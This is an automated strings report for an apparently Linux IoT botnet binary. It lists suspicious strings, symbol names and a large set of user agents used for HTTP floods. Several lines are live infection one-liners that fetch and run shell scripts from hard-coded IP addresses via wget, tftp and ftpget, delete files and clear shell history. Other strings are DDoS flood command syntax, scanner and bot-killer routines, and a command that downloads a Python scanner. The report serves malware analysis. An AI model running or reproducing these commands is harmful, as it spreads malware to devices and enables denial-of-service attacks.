=============================================================================
========	BINARY ID :8a53059c3d6977343a0e63f1041a972e2438b234==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2453
SUPSCPECTED LINES COUNT :368
SUPSCPECTED STRINGS COUNT (DISTINCT) :30
SUPSCPECTED STRINGS WEIGHT :115
SUSPECT STRING SCORE : [115 / 150] 76%
USER AGENTS STRINGS COUNT :262
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :113
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
nopqrstuvw√ü
bin*
botnet
swatnet
fucknet
cracknet
weednet
gaynet
queernet
ballnet
unet
cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
telnet
/dev/netslink/
/usr/
/proc/cpuinfo
PING
\bFailed opening raw socket.
Invalid flag "%s"
AAAAAAAAnetcore
 cd /var/; rm -rf cuntysshd; wget http://64.137.253.50/cuntysshd || tftp -r cuntysshd -g 64.137.253.50; chmod 777 cuntysshd; ./cuntysshd; rm -rf cuntysshd
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)
Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/
BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)
zspider/0.9-dev http://feedback.redkolibri.com/
Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)
TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)
TheSuBot/0.2 (www.thesubot.de)
TheSuBot/0.1 (www.thesubot.de)
FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
Mozilla/4.0 (compatible: FDSE robot)
findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)
Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0
Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)
msnbot/1.0 (+http://search.msn.com/msnbot.htm)
msnbot/0.9 (+http://search.msn.com/msnbot.htm)
msnbot/0.11 ( http://search.msn.com/msnbot.htm)
MSNBOT/0.1 (http://search.msn.com/msnbot.htm)
Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)
NetResearchServer/4.0(loopimprovements.com/robot.html)
NetResearchServer/3.5(loopimprovements.com/robot.html)
NetResearchServer/2.8(loopimprovements.com/robot.html)
NetResearchServer/2.7(loopimprovements.com/robot.html)
NetResearchServer/2.5(loopimprovements.com/robot.html)
Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)
Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET 
Googlebot/2.1 (http://www.googlebot.com/bot.html)
YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)
Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6
MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)
Gigabot/3.0 (http://www.gigablast.com/spider.html)
Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+
Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36
Rome Client (http://tinyurl.com/64t5n) Ver: 0.9
Googlebot 1.01.003
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)
Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13
Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1
Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60
Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25
Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)
Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)
Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)
HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)
Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620
Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)
Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py
INSTALLING PYTHON SCANNER
UPDATING PYTHON SCANNER
killall -9 python;pkill python
STOPPING PYTHON SCANNER
STARTING VOIDS HACKA SCANNA
SCANNER
STOPPING SCANNER
STARTING SCANNER ON -> %s
NETIS
STOPPING NETIS SCANNER
STARTING NETIS SCANNER
COMMENCING BOT KILL ON -> %s
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
HTTP
CNC <target> <port> <time>
STD <target> <port> <time>
KILLATTK
Killed %d.
None Killed.
/proc/net/route
/etc/rc.d/rc.local
fork failed\n
Connected %s:%s
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/i386/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4203
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
__malloc_largebin_index
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
NetisScanner
sendHTTP
GetRandomIP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
UpdateBins
__get_hosts_byname_r
botkiller
__GI_inet_pton
gethostbyname
__vfork
knownBots
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
__GI_vfork
NetisRanges
__GI_inet_addr
__libc_connect
pids
sigprocmask
^8PSh
^8PSh
xAPPSh x
PPSh
^8PSh
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
